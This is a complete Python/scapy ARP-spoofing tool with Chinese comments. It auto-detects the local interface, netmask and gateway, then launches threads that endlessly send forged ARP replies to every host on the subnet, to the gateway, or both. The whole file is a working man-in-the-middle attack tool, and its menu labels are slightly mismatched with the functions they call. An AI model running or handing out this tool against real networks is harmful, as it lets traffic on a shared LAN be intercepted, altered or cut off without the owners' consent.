import threading
import ipaddress
import sys
from typing import List, NoReturn
import scapy.all



# ===================== 子网掩码获取=====================

def get_netmask_by_interface(interface) -> str:
    try:
        for route in scapy.all.conf.route.routes:
            if len(route) < 4:
                continue
            network, netmask, gateway, iface = route[0], route[1], route[2], route[3]
            if iface == interface and network != 0 and netmask != 0:
                # 整数掩码 → 点分十进制
                import struct, socket
                mask_str: str = socket.inet_ntoa(struct.pack('!I', netmask))
                if mask_str != "0.0.0.0":
                    return mask_str
    except Exception:
        pass
    return "255.255.255.0"  # 回退默认值



def netmask_to_prefix(netmask_str) -> int:
    """将点分十进制子网掩码转为前缀长度，如 '255.255.255.0' → 24"""
    try:
        return ipaddress.IPv4Network(f"0.0.0.0/{netmask_str}").prefixlen
    except Exception:
        return 24  # 回退


def get_gateway_by_interface(interface):
    """根据指定网卡从路由表中获取对应网关"""
    try:
        for route in scapy.all.conf.route.routes:
            if len(route) < 4:
                continue
            network, netmask, gateway, iface = route[0], route[1], route[2], route[3]
            if iface == interface and network == 0 and netmask == 0:
                if gateway and gateway != "0.0.0.0":
                    return gateway
    except Exception:
        pass
    try:
        gw = scapy.all.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    return ""


def get_ip_network(local_ip, prefix_len) -> ipaddress.IPv4Network | ipaddress.IPv6Network:
    """根据 IP 和前缀长度计算网段"""
    return ipaddress.ip_network(f"{local_ip}/{prefix_len}", strict=False)


# ===================== ARP 欺骗 =====================

def spoof_host(victim_ip, attacker_mac, gateway_ip, interface) -> NoReturn:
    ether = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
    arp = scapy.all.ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=attacker_mac)
    packet = ether / arp
    while True:
        scapy.all.sendp(packet, iface=interface, verbose=False)


def spoof_route(victim_ip, attacker_mac, gateway_ip, interface) -> NoReturn:
    ether = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
    arp = scapy.all.ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=attacker_mac)
    packet = ether / arp
    while True:
        scapy.all.sendp(packet, iface=interface, verbose=False)


def start_threads(target_func, hosts, attacker_mac, gateway_ip, interface, local_ip) -> None:
    for ip in hosts:
        if ip == local_ip or ip == gateway_ip:
            continue
        t = threading.Thread(
            target=target_func,
            args=(ip, attacker_mac, gateway_ip, interface)
        )
        t.daemon = True
        t.start()


# ===================== 网卡选择 =====================

def list_interfaces() -> List[str]:
    """列出所有可用网络接口（含子网掩码和网关）"""
    ifaces: List[str] = scapy.all.get_if_list()
    print("\n===== 可用网络接口 =====")
    header: str = f"{'编号':<5}{'接口':<16}{'MAC地址':<20}{'IP地址':<17}{'子网掩码':<17}{'网关'}"
    print(header)
    print("-" * 95)
    for idx, iface in enumerate(ifaces, 1):
        try:
            mac: str = scapy.all.get_if_hwaddr(iface)
        except Exception:
            mac = "N/A"
        try:
            ip: str = scapy.all.get_if_addr(iface)
        except Exception:
            ip = "N/A"
        mask: str = get_netmask_by_interface(iface) or "N/A"
        gw = get_gateway_by_interface(iface) or "N/A"
        print(f"{idx:<5}{iface:<16}{mac:<20}{ip:<17}{mask:<17}{gw}")
    print("-" * 95)
    return ifaces


def select_interface() -> str:
    ifaces: List[str] = list_interfaces()
    while True:
        choice: str = input(f"\n请选择网卡编号 [1-{len(ifaces)}]: ").strip()
        try:
            idx: int = int(choice) - 1
            if 0 <= idx < len(ifaces):
                selected: str = ifaces[idx]
                print(f"[✓] 已选择: {selected}")
                return selected
            else:
                print("[!] 编号超出范围，请重新输入。")
        except ValueError:
            print("[!] 请输入有效数字。")


# ===================== 信息输入 =====================

def input_manual_info():
    """手动选择网卡并配置（含子网掩码）"""
    print("\n===== 手动配置自身信息 =====")

    # 1. 选择网卡
    interface: str = select_interface()

    # 2. 本地IP
    default_ip: str = scapy.all.get_if_addr(interface)
    local_ip: str = input(f"  本地IP地址 (默认: {default_ip}): ").strip()
    if not local_ip:
        local_ip: str = default_ip

    # 3. MAC地址
    default_mac: str = scapy.all.get_if_hwaddr(interface)
    attacker_mac: str = input(f"  攻击者MAC地址 (默认: {default_mac}): ").strip()
    if not attacker_mac:
        attacker_mac: str = default_mac

    # 4. 子网掩码
    default_mask: str = get_netmask_by_interface(interface)
    if default_mask:
        mask_input: str = input(f"  子网掩码 (默认: {default_mask}): ").strip()
        if not mask_input:
            netmask: str = default_mask
        else:
            netmask: str = mask_input
    else:
        netmask: str = input("  子网掩码 (未检测到，请输入，如 255.255.255.0): ").strip()
        if not netmask:
            netmask = "255.255.255.0"
            print(f"  [i] 使用默认值: {netmask}")

    # 5. 网关IP
    default_gw = get_gateway_by_interface(interface)
    if default_gw:
        gateway_ip: str = input(f"  网关IP地址 (默认: {default_gw}): ").strip()
        if not gateway_ip:
            gateway_ip = default_gw
    else:
        gateway_ip: str = input("  网关IP地址 (未检测到，请手动输入): ").strip()
        if not gateway_ip:
            print("[!] 网关IP不能为空，退出。")
            sys.exit(1)

    return interface, local_ip, attacker_mac, netmask, gateway_ip


def input_auto_info():
    """自动检测"""
    interface = scapy.all.conf.iface
    attacker_mac: str = scapy.all.get_if_hwaddr(interface)
    local_ip: str = scapy.all.get_if_addr(interface)
    netmask: str = get_netmask_by_interface(interface) or "255.255.255.0"
    gateway_ip = get_gateway_by_interface(interface)
    if not gateway_ip:
        print("[!] 无法自动获取网关，请改用手动模式。")
        sys.exit(1)
    return interface, local_ip, attacker_mac, netmask, gateway_ip


# ===================== 校验 =====================

def validate_ip(ip_str, name) -> None:
    try:
        ipaddress.ip_address(ip_str)
    except ValueError:
        print(f"[!] 无效的{name}: {ip_str}")
        sys.exit(1)


def validate_mac(mac_str) -> None:
    parts = mac_str.replace('-', ':').split(':')
    if len(parts) != 6:
        print(f"[!] 无效的MAC地址: {mac_str}")
        sys.exit(1)
    try:
        for p in parts:
            int(p, 16)
    except ValueError:
        print(f"[!] 无效的MAC地址: {mac_str}")
        sys.exit(1)


def validate_netmask(mask_str) -> None:
    """校验子网掩码格式"""
    try:
        ipaddress.IPv4Network(f"0.0.0.0/{mask_str}")
    except Exception:
        print(f"[!] 无效的子网掩码: {mask_str}")
        sys.exit(1)


# ===================== 主函数 =====================

def main() -> None:
    print("=" * 50)
    print("         ARP Spoof Tool")
    print("=" * 50)

    print("\n请选择自身信息获取方式:")
    print("  1) 自动检测（使用默认网卡）")
    print("  2) 手动选择网卡并配置")
    info_choice: str = input("Enter a number [1/2]: ").strip()

    if info_choice == '1':
        interface, local_ip, attacker_mac, netmask, gateway_ip = input_auto_info()
    elif info_choice == '2':
        interface, local_ip, attacker_mac, netmask, gateway_ip = input_manual_info()
    else:
        print("[!] 无效选择，退出。")
        sys.exit(1)

    # 校验
    validate_ip(local_ip, "本地IP")
    validate_ip(gateway_ip, "网关IP")
    validate_mac(attacker_mac)
    validate_netmask(netmask)

    # 计算前缀长度
    prefix_len: int = netmask_to_prefix(netmask)
    network: ipaddress.IPv4Network | ipaddress.IPv6Network = get_ip_network(local_ip, prefix_len)
    hosts: list[str] = [str(ip) for ip in network.hosts()]

    # 显示配置
    print("\n" + "=" * 50)
    print(f"  网络接口   : {interface}")
    print(f"  本地IP     : {local_ip}")
    print(f"  MAC地址    : {attacker_mac}")
    print(f"  子网掩码   : {netmask} (/{prefix_len})")
    print(f"  网关IP     : {gateway_ip}")
    print(f"  目标网段   : {network}")
    print(f"  主机数量   : {len(hosts)}")
    print("=" * 50)

    # 选择攻击模式
    print("\nPlease select mode:")
    print("  1) Spoof Route  (欺骗网关)")
    print("  2) Spoof Host   (欺骗主机)")
    print("  3) Mixed Mode   (双向欺骗)")
    choice: str = input("Enter a number [1/2/3]: ").strip()

    if choice == '1':
        print("\n[*] Start Spoof Host ...")
        start_threads(spoof_host, hosts, attacker_mac, gateway_ip, interface, local_ip)
    elif choice == '2':
        print("\n[*] Start Spoof Route ...")
        start_threads(spoof_route, hosts, attacker_mac, gateway_ip, interface, local_ip)
    elif choice == '3':
        print("\n[*] Start Mixed Mode ...")
        start_threads(spoof_host, hosts, attacker_mac, gateway_ip, interface, local_ip)
        start_threads(spoof_route, hosts, attacker_mac, gateway_ip, interface, local_ip)
    else:
        print("[!] 无效选择，退出。")
        sys.exit(1)

    print("[*] 运行中... 按 Ctrl+C 停止\n")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] 已停止。")


if __name__ == "__main__":
    main()
